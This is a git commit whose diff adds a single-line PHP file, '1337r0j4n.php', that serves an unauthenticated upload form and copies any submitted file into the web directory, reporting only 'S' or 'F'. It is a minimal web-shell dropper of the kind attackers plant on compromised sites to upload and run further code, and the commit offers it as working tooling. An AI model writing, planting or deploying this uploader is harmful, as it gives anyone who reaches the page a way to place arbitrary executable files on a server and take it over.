d409505437bc42dc6c4b00b327080da52aa2e3c6
1337r0j4n <84887432+1337r0j4n@users.noreply.github.com>
2023-10-21 09:53:15 +0630

    Add files via upload

---
+++ 1337r0j4n.php
@@ -0,0 +1,1 @@
+<?php echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>S</b><br><br>'; }else { echo '<b>F</b><br><br>'; }}?>
